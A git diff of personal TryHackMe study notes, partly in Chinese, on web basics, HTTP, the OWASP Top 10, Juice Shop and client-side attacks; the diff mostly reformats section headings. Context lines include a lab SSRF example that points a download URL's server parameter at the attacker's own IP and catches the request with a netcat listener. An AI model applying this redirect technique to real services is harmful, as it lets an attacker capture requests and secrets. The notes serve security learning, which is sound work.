@@ -1,4 +1,4 @@
-How Websites Work:
+## How Websites Work:
 	--> https://tryhackme.com/r/room/howwebsiteswork
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Front End (Client-Side)
@@ -11,8 +11,7 @@ How Websites Work:
 		--> <button onclick='document.getElementById("demo").innerHTML = "Hack the Planet";'>Click Me!</button>
 		--> 敏感資料暴露 e.g username //password
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-HTTP in Detail : 
+## HTTP in Detail : 
 	--> https://tryhackme.com/r/room/httpindetail
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Methods
@@ -55,8 +54,7 @@ HTTP in Detail :
 			--> Set-Cookie：要儲存的信息
 			--> Cache-Control： 快取
 			--> Content-Encoding
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-OWASP Top 10
+## OWASP Top 10
 	-->https://tryhackme.com/r/room/owasptop10 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	--> Broken Authentication :
@@ -133,8 +131,7 @@ OWASP Top 10
 		--> exploit-db
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	--> Insufficent Logging & Monitoring (日誌記錄與監控不足)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-OWASP Top 10 - 2021
+## OWASP Top 10 - 2021
 	--> https://tryhackme.com/r/room/owasptop102021
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Broken Access Control (IDOR) --id
@@ -202,8 +199,7 @@ OWASP Top 10 - 2021
 		--> 10.10.225.128:8087/download?server=secure-file-storage.com
 			=> http://10.10.225.128:8087/download?server=10.11.92.230:8087&id=75482342
 			=> nc -lvnp 8087
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-OWASP Juice Shop
+## OWASP Juice Shop
 	--> https://tryhackme.com/r/room/owaspjuiceshop
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Injection
@@ -286,8 +282,7 @@ OWASP Juice Shop
 		--> 將 O-Saft 產品描述中的連結更改為http://kimminich.de
 		--> 復活節彩蛋
 		--> 偽造優惠券代碼
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Advanced Client-Side Attacks : 
+## Advanced Client-Side Attacks : 
 	--> https://tryhackme.com/module/advanced-client-side-attacks	
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> XSS :
